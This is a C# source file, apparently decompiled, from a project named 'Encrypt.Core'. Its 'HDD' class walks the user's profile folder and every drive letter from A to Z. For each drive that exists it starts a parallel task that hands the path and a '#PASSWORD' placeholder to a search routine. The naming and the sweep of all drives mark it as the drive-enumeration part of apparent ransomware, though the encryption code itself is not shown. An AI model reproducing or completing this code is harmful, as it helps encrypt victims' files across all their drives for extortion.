using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace Encrypt.Core;

internal class HDD
{
	private readonly Search _Search = new Search();

	private readonly List<Task> _Task_List = new List<Task>();

	private readonly string[] _Virtual_Partitions = new string[26]
	{
		"C:\\Users\\" + Environment.UserName,
		"K:\\",
		"L:\\",
		"M:\\",
		"N:\\",
		"O:\\",
		"D:\\",
		"A:\\",
		"B:\\",
		"F:\\",
		"Q:\\",
		"G:\\",
		"H:\\",
		"R:\\",
		"S:\\",
		"J:\\",
		"U:\\",
		"W:\\",
		"V:\\",
		"X:\\",
		"T:\\",
		"Y:\\",
		"Z:\\",
		"E:\\",
		"P:\\",
		"I:\\"
	};

	internal void Start()
	{
		string[] virtual_Partitions = _Virtual_Partitions;
		foreach (string _Partition in virtual_Partitions)
		{
			if (Directory.Exists(_Partition))
			{
				Task item = Task.Factory.StartNew(delegate
				{
					_Search.Data(_Partition, "#PASSWORD");
				});
				_Task_List.Add(item);
			}
		}
		Task.WaitAll(_Task_List.ToArray());
	}
}
